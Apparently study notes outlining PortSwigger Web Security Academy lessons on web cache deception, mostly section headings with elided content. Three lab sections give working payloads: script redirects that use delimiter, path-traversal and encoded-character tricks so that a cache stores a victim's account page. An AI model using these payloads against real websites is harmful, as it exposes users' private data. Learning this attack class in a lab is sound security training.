...
# 7 ## Exploiting static extension cache rules
...
# 9 ## Path mapping discrepancies - Continued
...
# 10 ## Exploiting path mapping discrepancies
...
# 11 ## Lab: Exploiting path mapping for web cache deception
...
[lab1](labs/lab1-cachepoisoining.md)

---

# 12 ## Delimiter discrepancies
...
# 13 ## Delimiter discrepancies - Continued
...
# 14 ## Delimiter discrepancies - Continued
...
# 15 ## Delimiter discrepancies - Continued
...
# 16 ## Exploiting delimiter discrepancies
...
# 17 ## Exploiting delimiter discrepancies - Continued
...
# 18 ## Exploiting delimiter discrepancies - Continued
...
# 19 ## Lab: Exploiting path delimiters for web cache deception
...
solution
```
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;something.js"</script>
```

---

# 20 ## Delimiter decoding discrepancies
...
# 21 ## Delimiter decoding discrepancies - Continued
...
# 22 ## Exploiting delimiter decoding discrepancies
...
# 23 ## Exploiting static directory cache rules
...
# 24 ## Normalization discrepancies
...
# 25 ## Detecting normalization by the origin server
...
# 26 ## Detecting normalization by the cache server
...
# 27 ## Detecting normalization by the cache server - Continued
...
# 28 ## Detecting normalization by the cache server - Continued
...
# 29 ## Exploiting normalization by the origin server
...
# 30 ## Lab: Exploiting origin server normalization for web cache deception
...
```
<script>
document.location="https://0ac1004f03adc93080d21218009d009c.web-security-academy.net/resources/js/../..%2fmy-account?something.js"
</script>
```

---

# 31 ## Exploiting normalization by the cache server
...
The origin server is likely to return an error message instead of profile information.## Exploiting normalization by the cache server
...
# 32 ## Exploiting normalization by the cache server - Continued
...
# 33 ## Lab: Exploiting cache server normalization for web cache deception
...
```
<script>
document.location="https://0a2f00ad04204250809417dc00c700c8.web-security-academy.net/my-account%23%2f%2e%2e%2fresources/pwn.js"
</script>
```

---

# 34 ## Exploiting file name cache rules
...
# 35 ## Detecting normalization discrepancies
...
# 36 ## Exploiting normalization discrepancies
...
# 37 ## Preventing web cache deception vulnerabilities
